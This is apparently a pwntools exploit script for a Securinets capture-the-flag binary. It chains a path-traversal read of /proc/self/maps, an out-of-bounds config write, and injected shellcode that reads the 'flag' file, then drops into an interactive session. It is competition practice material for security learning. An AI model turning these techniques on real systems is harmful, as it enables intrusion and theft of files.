#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './services'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'info'
host, port = 'pwn.ctf.securinets.tn', 4444

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *backupMessages
break *backupMessages+91
'''.format(**locals())

def updateConfig(idx, payload):
    io.sendlineafter(b'Choice:', b'2')
    io.sendlineafter(b'index', str(idx).encode())
    io.sendlineafter(b'New', flat(payload))

# =========================================================
#                         EXPLOITS
# =========================================================
io = initialize()
rop = ROP(exe)

# leaking vmmap
vmmap = b'../../../../../../../../../../../proc/self/maps'
io.sendlineafter(b'Choice:', b'1')
io.sendlineafter(b'ID', vmmap)

# grabbing elf base address
io.recvline()
elf.address = int(io.recvline().decode()[:12], 16)
config = elf.address + 0x4060

# grabbing mmap address
while(True):
    line = io.recvline().decode()
    if('rwxp' in line):
        backupCodeAddr = int(line[:12], 16)
        break

# setting up *(config + 16) to be the address of key string 
updateConfig(2, config + 24)

# setting up *(&config + 24) to be the key string
updateConfig(3, b'backup: 1\x00')

# generating shellcodes
# shellcode = bytes(asm(shellcraft.linux.open("flag")))
# shellcode += asm(shellcraft.linux.syscall("SYS_read", "rax", "rsp", 0x100))
# shellcode += asm(shellcraft.linux.syscall("SYS_write", 1, "rsp", "rax"))
# print(shellcode)

# counting offset to shellcode area from &config
offset = int( (backupCodeAddr - (config) ) / 8 )

shellcodes = [
    b'hflagH\x89\xe7',
    b'1\xd21\xf6j\x02X\x0f',
    b'\x05H\x89\xc71\xc01\xd2',
    b'\xb6\x01H\x89\xe6\x0f\x05H',
    b'\x89\xc2j\x01Xj\x01_',
    b'H\x89\xe6\x0f\x05'
]

# inserting shellcode
for sc in shellcodes:
    assert len(sc) <= 8
    info('=== updating %#x ===', (config + (offset * 8)) )
    updateConfig(offset, sc)
    offset += 1

# setting up shellcode address
updateConfig(9, backupCodeAddr)

# execute shellcode
io.sendlineafter(b'Choice:', b'3')

info('elf addr: %#x', elf.address)
info('backupCode addr: %#x', backupCodeAddr)

io.interactive()